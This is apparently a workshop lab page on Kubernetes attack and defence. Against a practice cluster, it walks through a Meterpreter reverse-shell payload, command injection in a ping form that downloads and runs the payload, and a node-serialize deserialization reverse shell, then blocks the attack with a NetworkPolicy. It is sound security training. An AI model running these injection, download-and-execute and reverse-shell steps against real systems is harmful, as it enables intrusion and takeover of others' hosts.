@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kubernetes Network Policies | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kubernetes Network Policies" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-network-policies/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-network-policies/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kubernetes Network Policies" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kubernetes Network Policies","url":"http://0.0.0.0:10000/exercises/kubernetes-network-policies/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kubernetes Network Policies</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>SSH into the control plane node on the cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /sync/bustakube-node-key root@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Activate the Secrets scenario:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/bustakube/Scenario-Seat-Meister/stage-scenario.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>Keep this SSH session open for later.</p>
+</li>
+<li>
+<p>Now, before we go further, let's set up Metasploit so we can use it for command and control when we get into this cluster.</p>
+</li>
+<li>
+<p>Start a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Create a directory for creating Meterpreter binaries. Change directory into that new directory.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> ~/meterpreter
+<span class="nb">cd</span> ~/meterpreter
+</code></pre></div></div>
+</li>
+<li>
+<p>Create a new Meterpreter binary for this exercise:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nt">-a</span> x86 <span class="nv">LHOST</span><span class="o">=</span>10.23.58.30 <span class="nv">LPORT</span><span class="o">=</span>4445 <span class="nt">-o</span> mrsbin <span class="nt">-f</span> elf
+</code></pre></div></div>
+</li>
+<li>
+<p>Create a matching Metasploit console RC script, containing the commands that you'd run to set up the <code>multi/handler</code> to await incoming connections from this Meterpreter:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;mrsbin.rc
+use multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 10.23.58.30
+set LPORT 4445
+set ExitOnSession false
+exploit -j
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Start a webserver listening in our <code>~/meterpreter</code> directory to allow compromised systems to pull a copy of the <code>mrsbin</code> binary:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Next, start up the Metasploit Framework console, <code>msfconsole</code>, passing it the path to the <code>mrsbin.rc</code> RC script we just created.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole <span class="nt">-r</span> ~/meterpreter/mrsbin.rc
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Run a TCP port scan of the first node's TCP ports that are reserved for node ports.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-p30000-32767</span> bustakube-node-1
+</code></pre></div></div>
+</li>
+<li>
+<p>Review the output - we see there is a web server running on port 31370.</p>
+</li>
+<li>
+<p>Start up a Firefox browser.  You can use the icon in the top left menu bar, or use the same &quot;Run&quot; process from step 1.  Then browse to the web application via this URL:</p>
+<p><a href="http://bustakube-node-1:31370/">http://bustakube-node-1:31370/</a></p>
+</li>
+<li>
+<p>Notice that you're seeing a web page telling you about the difficulties a large online concert ticket site is having with availability.</p>
+</li>
+<li>
+<p>Hit <code>Ctrl-U</code> to view this web page's source.</p>
+<pre><code>Hit Ctrl-U
+</code></pre></li>
+<li>
+<p>Try out that <code>ping.php</code> page that the source code comment is mentioning:</p>
+<p><a href="http://bustakube-node-1:31370/ping.php">http://bustakube-node-1:31370/ping.php</a></p>
+</li>
+<li>
+<p>Notice that this form appears to be let you try to ping IP addresses, ostensibly so that Seat Meister staff can check uptime on servers.</p>
+</li>
+<li>
+<p>Try entering <code>127.0.0.1</code> into this form.</p>
+<pre><code>127.0.0.1
+</code></pre></li>
+<li>
+<p>That output might look familiar. It's the same output we'd get if we ran the standard <code>ping</code> utility commonly found on Linux systems. Let's look for an easy command injection. Try entering <code>127.0.0.1</code> into this form again, but add a <code>; id</code> to that.</p>
+<pre><code>127.0.0.1 ; id
+</code></pre></li>
+<li>
+<p>Notice that this form is clearly vulnerable to an injection attack and is adding our input to a shell command.  In using <code>id</code>, we've been told that the web server is running as user <code>www-data</code>. We can run arbitrary commands.</p>
+</li>
+<li>
+<p>Let's tell the form to download and run our Meterpreter binary (<code>mrsbin</code>).</p>
+</li>
+<li>
+<p>In the form field, add a curl command to download the <code>mrsbin</code> binary and write it (via <code>-o /tmp/mrsbin</code>) to <code>/tmp/mrsbin</code>. Then hit the &quot;submit&quot; button.</p>
+<pre><code>127.0.0.1 ; curl -o /tmp/mrsbin http://10.23.58.30/mrsbin
+</code></pre></li>
+<li>
+<p>Now tell the form to make that <code>mrsbin</code> binary executable and run it. Put this in the form field and hit the &quot;submit&quot; button.</p>
+<pre><code>127.0.0.1 ; chmod 755 /tmp/mrsbin ; /tmp/mrsbin
+</code></pre></li>
+<li>
+<p>Go check your Metasploit console. You should now see a line that reads something like &quot;Meterpreter session 1 opened…&quot;</p>
+</li>
+<li>
+<p>Interact with this new session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+</li>
+<li>
+<p>Instruct Meterpreter to give you a minimal interactive shell. You won't get any immediate feedback from the system, just a &quot;Process … created&quot; and &quot;Channel … created&quot; line from Metasploit.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Make the shell more interactive by starting a bash process with the <code>-i</code> flag:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>List the current directory to look for any other web content.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>It looks like there's a directory here called <code>oldsite/</code>. Maybe this hastily-built news site repurposed an existing webserver...  Switch back to your browser.</p>
+</li>
+<li>
+<p>Visit this URL, corresponding to that <code>oldsite/</code> directory.</p>
+<p><a href="http://bustakube-node-1:31370/oldsite/">http://bustakube-node-1:31370/oldsite/</a></p>
+</li>
+<li>
+<p>It looks like Seat Meister used to use this site for bidding out third party software development. There may be some good OSINT here. Let's click on that &quot;Seat Popularity checker service&quot; project that is in the &quot;Bidding Closed&quot; section. Click that title or this link:</p>
+<p><a href="http://bustakube-node-1:31370/oldsite/seatpopspec.html">http://bustakube-node-1:31370/oldsite/seatpopspec.html</a></p>
+</li>
+<li>
+<p>It looks like Seat Meister was trying to create some kind of microservice that would indicate how many customers were putting a given seat in their cart. That could explain why their site is so busy. If ticket scalpers have found a way to reach that service, the scalpers could watch for what seats are getting put in carts, then buy those exact seats first! That would drive up ticket prices and keep Seat Meister's servers incredibly busy.</p>
+</li>
+<li>
+<p>The URL in that specification looks like a Kubernetes cluster DNS record, served up by KubeDNS or CoreDNS. It corresponds to a service called <code>seatpop</code> in a namespace called <code>private</code>. Here is the host component of it:</p>
+<pre><code>seatpop.private.svc.cluster.local
+</code></pre></li>
+<li>
+<p>Let's go back into our Meterpreter session and see if we can reach it. Switch back to your terminal window.</p>
+</li>
+<li>
+<p>From the remote container shell, run a curl command against that URL:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://seatpop.private.svc.cluster.local/
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we seem to have found the microservice described in that specification web site. Here's the output of the last command on our test system:</p>
+<pre><code>This microservice answers /popularity?seat=, where seat is a Base64-serialized object: city:str, section:str, seat:str
+</code></pre></li>
+<li>
+<p>We want to query that microservice. Remember that the specification web page gave us an example object:</p>
+<pre><code>{&quot;city&quot;:&quot;Portland&quot;,&quot;section&quot;:&quot;A&quot;,&quot;seat&quot;:&quot;7-14&quot;}
+</code></pre></li>
+<li>
+<p>We need to Base64-encode the object, though.  Take a look at what the Base64-encoded version would look like.  We could look up a Base64-encoder on the web, but there's a simple command line tool for it. Try it out:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'{"city":"Portland","section":"A","seat":"7-14"}'</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0
+</code></pre></div></div>
+</li>
+<li>
+<p>Now that we know how to make a Base64-encoded object, let's try passing it as a GET parameter called <code>seat</code> on the <code>/popularity</code> API endpoint:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">object</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="s1">'{"city":"Portland","section":"A","seat":"7-14"}'</span> |
+          <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="si">)</span>
+curl <span class="nt">-s</span> http://seatpop.private.svc.cluster.local/popularity?seat<span class="o">=</span><span class="nv">$object</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that you were successful - the microservice returned an answer. Here's the output of the last command on our test system:</p>
+<pre><code>In checkout cart for 5 customers
+</code></pre></li>
+<li>
+<p>Now, remember that the specification web page had told us that this seat popularity microservice had to be written in JavaScript, for Node.js? It turns out that a very popular object serialization library for Node.js, called <code>node-serialize</code>, has a remote code execution vulnerability that has been present for years and is not being fixed. We can try the exploit to determine if the code is vulnerable.</p>
+</li>
+<li>
+<p>Stop and read about the vulnerability, if you like.</p>
+</li>
+</ol>
+<ul>
+<li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">Exploiting Node JS deserialization for RCE</a></li>
+</ul>
+<ol start="46">
+<li>
+<p>We're going to use the same recipe that the author of that post did, creating an exploit that causes the vulnerable Node.js-hosted JavaScript code to connect back to us with a reverse shell.</p>
+</li>
+<li>
+<p>Before we start building an exploit, we'll need a netcat listener.  Start up a new terminal tab with Ctrl-Shift-t.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Start up a netcat listener on port 9999 on your Kali system, so you have something to catch shells.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 9999
+</code></pre></div></div>
+</li>
+<li>
+<p>Start up a new terminal tab with Ctrl-Shift-t. We'll use this to create the exploit.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Grab a copy of <code>nodejsshell.py</code> from GitHub. It's written for Python 2.7, as opposed to Python 3.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">url</span><span class="o">=</span><span class="s2">"https://raw.githubusercontent.com/ajinabraham"</span>
+curl <span class="nt">-LO</span> <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/Node.Js-Security-Course/master/nodejsshell.py
+</code></pre></div></div>
+</li>
+<li>
+<p>Try using <code>nodejsshell.py</code> to create an encoded JavaScript reverse shell that will connect back to a netcat listener on TCP port 9999 your Kali system, which has IP address 10.23.58.30:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2.7 nodejsshell.py 10.23.58.30 9999
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait - it looks like the part we need out of this output is just one line, which begins with &quot;eval&quot;. Try grabbing just that line and putting it into a variable called <code>middle</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">middle</span><span class="o">=</span><span class="si">$(</span> python2.7 nodejsshell.py 10.23.58.30 9999 | <span class="nb">grep eval</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, we need to build a JavaScript object that has that code in a function. Let's construct that string step by step. First, create a variable called <code>beginning</code> that has the same preamble block of code that we saw in the exploit writeup.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">beginning</span><span class="o">=</span><span class="s1">'{"rce":"_$$ND_FUNC$$_function (){  '</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, create a variable called <code>end</code> that has the end of the block we saw in the write-up.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">end</span><span class="o">=</span><span class="s1">'}()"}'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, put these three strings together and Base64-encode them:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">beginning</span><span class="k">}${</span><span class="nv">middle</span><span class="k">}</span><span class="nv">$end</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="p">;</span> <span class="nb">echo</span> <span class="s2">""</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Copy the string from the last command's output.</p>
+</li>
+<li>
+<p>Switch to the terminal window/tab where you have your Meterpreter session.</p>
+</li>
+<li>
+<p>Now use that exploit as your Base64-encoded seat object - you can use this curl command, but you need to put the string from the previous step at the end of it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://seatpop.private.svc.cluster.local/popularity?seat<span class="o">=</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now go back to the window where you have netcat listening on TCP port 9999. Observe that you have a connection. Here's the output on our test system:</p>
+<pre><code>Connected!
+</code></pre></li>
+<li>
+<p>See what pod you've got access in:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hostname</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>List the current directory.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that there's a flag directory here. Let's explore it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls </span>flag
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that there's a flag directory here. Let's explore it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>flag/FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>This flag challenges us to create a network policy that would allow the pods in the <code>private</code> namespace to communicate with each other, while not permitting incoming traffic from everywhere else. We can do this!</p>
+</li>
+<li>
+<p>First, let's exit this shell, so we're back to being on our Kali system:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, set up that netcat listener again, so we can retry the attack after we put in this network policy defense.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 9999
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, go back to the very first terminal window/tab you used in this exercise, where you had used <code>ssh</code> to log in to the control plane node.</p>
+</li>
+<li>
+<p>Make sure you're still logged into the control plane node:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hostname</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, write a YAML manifest for a network policy to the filesystem:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;netpol-allow-traffic-from-same-namespace.yaml
+kind: NetworkPolicy
+apiVersion: networking.k8s.io/v1
+metadata:
+  namespace: private
+  name: all-pods-allow-from-other-pods-in-this-namespace
+spec:
+  podSelector:
+    matchLabels:
+  ingress:
+  - from:
+    - podSelector: {}
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Now, apply this network policy:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> netpol-allow-traffic-from-same-namespace.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now go to the terminal tab where you had run the curl command that began <code>curl http://seatpop.private</code> and re-run the curl command:</p>
+<pre><code>Run the curl command that fired the exploit - you may want to copy-and-paste
+it from earlier in that terminal session.
+</code></pre></li>
+<li>
+<p>Notice that you are now unable to reach the vulnerable microservice. Here's the output on our test system:</p>
+<pre><code>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                Dload  Upload   Total   Spent    Left  Speed
+0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+0     0    0     0    0     0      0      0 --:--:--  0:02:09 --:--:--     0
+curl: (28) Failed to connect to seatpop.private.svc.cluster.local port 80: Connection timed out
+</code></pre></li>
+<li>
+<p>This exercise is over. Please close all the terminal tabs you opened for it.</p>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
